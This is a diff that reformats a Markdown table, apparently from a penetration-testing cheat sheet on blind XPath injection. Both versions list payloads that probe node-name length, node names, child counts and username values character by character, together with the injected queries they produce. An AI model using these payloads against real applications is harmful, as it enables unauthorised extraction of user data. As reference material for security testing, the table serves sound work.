@@ -84,13 +84,13 @@ Restricted:
 
 #### Blind Data Exfiltration
 
-|Description|Payload|Query|
-|---|---|---|
-|Exfiltrating Node Name's Length|`invalid' or string-length(name(/*[1]))=1 and '1'='1`|`/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']`|
-|Exfiltrating Node Name|`invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']`|
-|Exfiltrating Number of Child Nodes|`invalid' or count(/*[1]/*)=1 and '1'='1`|`/users/user[username='invalid' or count(/*[1]/*)=1 and '1'='1']`|
-|Exfiltrating Value Length|`invalid' or string-length(/users/user[1]/username)=1 and '1'='1`|`/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']`|
-|Exfiltrating Value|`invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']`|
+| Description                        | Payload                                                             | Query                                                                                       |
+| ---------------------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
+| Exfiltrating Node Name's Length    | `invalid' or string-length(name(/*[1]))=1 and '1'='1`               | `/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']`               |
+| Exfiltrating Node Name             | `invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`             | `/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']`             |
+| Exfiltrating Number of Child Nodes | `invalid' or count(/*[1]/*)=1 and '1'='1`                           | `/users/user[username='invalid' or count(/*[1]/*)=1 and '1'='1']`                           |
+| Exfiltrating Value Length          | `invalid' or string-length(/users/user[1]/username)=1 and '1'='1`   | `/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']`   |
+| Exfiltrating Value                 | `invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1` | `/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']` |
 
 #### Time-based
 
